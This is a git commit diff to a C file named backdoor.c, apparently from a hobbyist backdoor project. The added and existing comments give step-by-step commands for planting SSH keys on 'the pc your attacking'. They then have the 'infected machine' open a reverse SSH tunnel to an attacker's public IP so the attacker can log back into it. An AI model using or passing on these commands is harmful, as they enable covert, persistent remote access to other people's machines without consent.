345ff7a1be32cc8ad168d31d15827a68e1c71f2c
Finn Wilkinson <finnwilkinson5@gmail.com>
2020-11-29 22:17:17 +0000

    Update backdoor.c

--- guest/backdoor.c
+++ guest/backdoor.c
@@ -1,7 +1,11 @@
 #include "backdoor.h"
 
+//do both of following commands on your own pc as well as pc your attacking
 //sudo apt-get install openssh-client
 //sudo apt-get install openssh-server
+
+//generate key `ssh-keygen`, press enter all times asked for input
+//`ssh-copy-id -i ~/.ssh/id_rsa user@host`
 
 //on infected machine run `ssh -fN -R 7000:localhost:22 username@attackerPublicIp` to set up reverse connection
 //on attacker machine run `ssh infectedUsername@localhost -p 7000`
